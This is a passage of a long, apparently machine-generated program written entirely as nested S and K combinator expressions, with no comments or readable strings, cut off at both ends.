(S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K))))((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)((K)(((S)(K))(K))))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K))))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K)))))))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K))))))))))))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K)))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K))))))))))(((((((S)((K)(S)))(K))((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(S))((((((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((S)((K)(S)))(K)))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K))))((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)((K)(((S)(K))(K))))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K))))))))(((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K)))(((S)(K))(K))))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))((S)((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(S))((((((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((S)((K)(S)))(K)))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K))))((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)((K)(((S)(K))(K))))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K))))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K)))))))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K))))))))))))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K)))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K))))))))))((K)(K)))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K))))))))))(((S)(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)((K)(S)))(K))((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(((((S)((K)(S)))(K))(S))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)((K)((K)(((S)(K))(K))))))))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(S))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)((K)(S)))(K)))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)((K)(S)))(K)))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K)))))))))((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)((K)(S)))(K))(S))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(S))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K)))))((((S)((K)(S)))(K))(((((S)((K)(S)))(K))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))))((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(((((S)((K)(S)))(K))(S))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)((K)((K)(((S)(K))(K))))))))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(S))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)((K)(S)))(K)))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)((K)(S)))(K)))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K)))))))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))((S)(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K)))(((S)(K))(K))))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(S))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(((S)((K)(S)))(K)))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(((S)((K)(S)))(K)))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(S))((((((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((S)((K)(S)))(K)))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K))))(((S)((((S)(S))((K)(((S)(K))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K)))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)((K)(((S)(K))(K))))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K)))))))))))))(((S)(K))(K))))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))((((S)((K)(S)))(K))((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K)))))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)(S))((K)(((S)(K))(K))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(((S)((K)(S)))(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(S))((((((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((S)((K)(S)))(K)))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K))))(((S)((((S)(S))((K)(((S)(K))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K)))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)((K)(((S)(K))(K))))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K)))))))))))))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K))))))))))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)((K)(S)))(K))(((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)